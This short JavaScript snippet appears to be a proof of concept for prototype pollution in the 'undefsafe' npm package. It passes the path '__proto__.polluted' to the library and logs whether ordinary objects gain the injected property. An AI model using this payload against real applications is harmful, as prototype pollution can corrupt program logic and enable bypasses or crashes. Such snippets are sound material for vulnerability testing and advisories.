Reflect.getPrototypeOf = () => false;
console.log({}.polluted);
const a = require('undefsafe');
const obj = {};
const payload = '__proto__.polluted';
a({}, payload, 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');